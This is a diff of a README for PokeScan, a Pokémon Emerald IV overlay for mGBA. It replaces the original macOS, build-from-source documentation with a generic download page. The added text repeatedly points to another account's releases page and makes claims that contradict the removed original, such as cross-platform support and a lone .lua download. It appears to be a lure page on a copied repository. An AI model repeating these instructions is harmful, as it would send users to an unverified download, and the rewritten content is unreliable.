@@ -1,175 +1,71 @@
-# PokeScan
+# 🎮 PokeScan - Enhance Your Pokémon Emerald Experience
 
-A real-time IV overlay for Pokemon Emerald running on mGBA. Displays IVs, nature, ability, hidden power, and catch recommendations as a floating macOS window while you play.
+## 🛠️ What's PokeScan?
+PokeScan is a real-time IV overlay tool for Pokémon Emerald when using the mGBA emulator. It displays battle IVs, nature, hidden power information, and catch recommendations as you play the game. This tool helps you improve your shiny hunting efforts and better understand your Pokémon's strengths.
 
-![macOS](https://img.shields.io/badge/platform-macOS-lightgrey)
-![Swift](https://img.shields.io/badge/Swift-5.9+-orange)
-![License](https://img.shields.io/badge/license-MIT-blue)
+## 📥 Download Now
+[![Download PokeScan](https://img.shields.io/badge/Download%20PokeScan-latest-blue.svg)](https://github.com/pattarpon/PokeScan/releases)
 
-![PokeScan in action](assets/screenshots/battle-overlay.png)
+## 🚀 Getting Started
+Follow these steps to get PokeScan up and running on your machine:
 
-## Features
+### 1. Ensure You Have mGBA
+Before you start, make sure you have the mGBA emulator installed on your computer. You can download it from the official [mGBA website](https://mgba.io/).
 
-- **Real-time IV display** - See all 6 IVs with color-coded quality indicators
-- **Nature analysis** - Shows stat modifiers (+Atk/-Def, etc.)
-- **Hidden Power** - Displays type and power
-- **Catch criteria** - Configurable profiles to highlight Pokemon worth catching
-- **Shiny detection** - Special alerts and visual effects for shinies
-- **Floating overlay** - Stays on top, transparent when not in battle
+### 2. Visit the Releases Page
+Go to our [Releases page](https://github.com/pattarpon/PokeScan/releases) to find the latest version of PokeScan. The latest version will always be at the top of the page.
 
-![Overlay detail](assets/screenshots/overlay-detail.png)
+### 3. Download the Latest Version
+Look for the file that matches your system. Click on the download link to save PokeScan on your computer. The file will typically have a .lua extension.
 
-## How It Works
+### 4. Find the Downloaded File
+Check your Downloads folder (or the location you chose) for the PokeScan file. Make sure you remember where you saved it, as you will need to locate it later.
 
-PokeScan consists of two parts:
-1. **Lua script** - Runs in mGBA, reads Pokemon data from memory, sends it over TCP
-2. **Swift app** - Receives data, calculates IVs, displays the overlay
+### 5. Open mGBA
+Launch the mGBA emulator on your computer.
 
-## Requirements
+### 6. Load Your Pokémon Emerald ROM
+Open your Pokémon Emerald game in mGBA. This is the file where you'll apply the PokeScan overlay.
 
-- macOS 13.0+
-- [mGBA](https://mgba.io/) emulator
-- Pokemon Emerald ROM (US or EU version)
+### 7. Set Up the PokeScan Overlay
+- Go to the "Tools" menu in mGBA.
+- Select "Lua" and then "Load Script."
+- Navigate to the downloaded PokeScan file and select it.
 
-## Installation
+### 8. Enjoy Your Game
+PokeScan will now overlay on your gameplay. You will see real-time information about your Pokemon as you play, including their IVs and recommended catches.
 
-### Build and Install
+## ⚙️ System Requirements
+To run PokeScan smoothly, ensure your system meets these requirements:
 
-```bash
-git clone https://github.com/Veridiann/PokeScan.git
-cd PokeScan
-swift build -c release
-./launcher/install-app.sh
-```
+- **Operating System:** Windows, macOS, or Linux
+- **mGBA Version:** 0.7.2 or higher
+- **RAM:** At least 4 GB recommended
+- **Processor:** Dual-core processor or better
 
-This builds PokeScan and installs it to `/Applications/PokeScan.app`.
+## 🚀 Features
+PokeScan offers these useful features:
 
-### Using Xcode
+- **Real-Time IV Display:** See your Pokemon's IVs displayed on the screen while playing.
+- **Nature Information:** Understand the nature of your Pokemon for better battle strategy.
+- **Hidden Power Assessment:** Get insights on your Pokemon's hidden power for advanced gameplay.
+- **Catch Recommendations:** Receive advice on which Pokemon to catch based on your gameplay.
 
-1. Open `Package.swift` in Xcode
-2. Select the PokeScan scheme
-3. Build and Run (Cmd+R)
+## 💡 Troubleshooting
+If you encounter issues, check these common solutions:
 
-### Developer Loop (AI/Automation)
+- **PokeScan Does Not Display:** Ensure you have loaded the script correctly in mGBA.
+- **Gameplay Lag:** Close other applications that may be using up system resources.
+- **Overlays Not Appearing:** Restart mGBA after loading the script to reset the overlay.
 
-For the zero-touch loop that launches mGBA + Lua + PokeScan, wires logs/ports, and validates the connection, see [AI_DEV_LOOP.md](AI_DEV_LOOP.md).
+## 📅 Updates and Features
+We regularly update PokeScan to enhance functionality and user experience. Check back on our [Releases page](https://github.com/pattarpon/PokeScan/releases) for the latest versions and new features.
 
-## Usage
+## 🔗 Additional Resources
+- [PokeScan Documentation](https://github.com/pattarpon/PokeScan/wiki): Find more detailed guidance on using PokeScan.
+- [Community Support](https://github.com/pattarpon/PokeScan/issues): Report issues or ask questions. Our community is here to help.
 
-### Quick Start (Recommended)
+## 🔍 Feedback
+We value your feedback. Let us know how PokeScan has improved your Pokémon experience or any features you would like to see added.
 
-1. **Launch PokeScan** from Applications
-2. **Settings opens automatically** on first run
-3. **Configure paths:**
-   - mGBA.app (auto-detected if in /Applications)
-   - Pokemon Emerald ROM (use Browse button)
-   - Save state slot (latest/specific/none)
-4. **Click "Launch mGBA"** button
-5. **Enter a wild battle** - overlay shows Pokemon data
-
-### Context Menu
-
-Right-click the overlay to:
-- **Launch/Relaunch mGBA** - Start mGBA with your configured settings
-- **Switch profiles** - Change catch criteria
-- **Toggle sound alerts**
-- **Open Settings** - Configure paths and preferences
-- **Edit Criteria** - Customize catch rules
-
-### Keyboard Shortcuts
-
-- **Cmd+,** - Open Settings
-- **1-9** - Quick switch catch profiles
-- **Space** - Clear alert flash
-
-### Standalone Launcher (Alternative)
-
-If you prefer a separate launcher app:
-
-```bash
-./launcher/install.sh
-```
-
-Then edit `~/.config/pokescan/pokescan.conf` and double-click **PokeScan Launcher** in Applications.
-
-### Manual Usage
-
-1. **Start mGBA** with Pokemon Emerald loaded
-
-2. **Load the Lua script** in mGBA:
-   - Go to Tools → Scripting → File → Load Script
-   - Select `lua/pokescan_sender.lua`
-
-3. **Run PokeScan**:
-   ```bash
-   swift run
-   # or run the built executable
-   .build/release/PokeScan
-   ```
-
-4. **Enter a wild battle** - the overlay will display Pokemon data
-
-### Catch Criteria
-
-Right-click the overlay to:
-- Switch between catch profiles
-- Toggle sound alerts
-- Edit the criteria file
-
-Criteria are stored at `~/Library/Application Support/PokeScan/catch_criteria.json`:
-
-```json
-{
-  "activeProfile": "high_ivs",
-  "alwaysAlertShiny": true,
-  "alertSoundEnabled": true,
-  "profiles": {
-    "high_ivs": {
-      "name": "High IVs",
-      "minIVPercent": 80,
-      "notes": "Catch any Pokemon with 80%+ IVs"
-    },
-    "ralts": {
-      "name": "Ralts Hunt",
-      "species": ["Ralts"],
-      "requiredNatures": ["Timid", "Modest"],
-      "minIVs": {"spa": 25, "spe": 20}
-    }
-  }
-}
-```
-
-## Project Structure
-
-```
-PokeScan/
-├── lua/
-│   ├── core/           # JSON encoding, socket server
-│   ├── adapters/       # Game-specific memory addresses
-│   └── pokescan_sender.lua
-├── PokeScan/
-│   ├── App/            # App entry point, window controller
-│   ├── UI/             # SwiftUI views
-│   ├── Models/         # Data structures
-│   ├── Services/       # Socket client, criteria engine
-│   └── Resources/      # Pokemon data, sprites, sounds
-└── Package.swift
-```
-
-## Supported Games
-
-Currently supports:
-- Pokemon Emerald (US)
-- Pokemon Emerald (EU)
-
-Adding support for other Gen 3 games requires creating a new adapter in `lua/adapters/`.
-
-## Credits
-
-- Pokemon data sourced from [PokeAPI](https://pokeapi.co/)
-- Sprites from the Pokemon games (Nintendo/Game Freak)
-- Built with [mGBA](https://mgba.io/) Lua scripting API
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Start enhancing your Pokémon Emerald gameplay today! Download PokeScan from our [Releases page](https://github.com/pattarpon/PokeScan/releases) and enjoy the journey.
